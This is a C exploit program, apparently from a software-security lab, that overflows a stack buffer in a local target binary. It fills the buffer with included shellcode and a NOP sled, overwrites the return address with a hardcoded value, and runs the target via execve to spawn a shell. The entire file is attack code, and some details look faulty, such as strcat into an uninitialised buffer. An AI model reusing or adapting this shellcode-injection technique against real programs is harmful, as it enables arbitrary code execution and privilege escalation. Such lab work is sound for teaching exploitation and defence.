#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

#define SHELL_SIZE 45
#define BUF_TO_RET 120
#define BUF_SIZE 125
#define BUF_ADDR 0x20211110

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];
	char attack_buffer[BUF_SIZE];

	strcat(attack_buffer, shellcode);
	for (int i = SHELL_SIZE; i < BUF_TO_RET; i++)
		attack_buffer[i] = 0x90;

	attack_buffer[BUF_TO_RET + 3] = (unsigned char) (BUF_ADDR & 0x000000ff);
	attack_buffer[BUF_TO_RET + 2] = (unsigned char) ((BUF_ADDR >> 8) & 0xff);
	attack_buffer[BUF_TO_RET + 1] = (unsigned char) ((BUF_ADDR >> 16) & 0x000000ff);
	attack_buffer[BUF_TO_RET] = (unsigned char) (BUF_ADDR >> 24);
	attack_buffer[BUF_TO_RET + 4] = '\0';

	printf("attack_buffer %s\n",attack_buffer);
	printf("%x\t%x\t%x\t%x\n",attack_buffer[BUF_TO_RET],
						attack_buffer[BUF_TO_RET + 1],
						attack_buffer[BUF_TO_RET + 2],
						attack_buffer[BUF_TO_RET + 3]);

	args[0] = TARGET;
	args[1] = attack_buffer;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
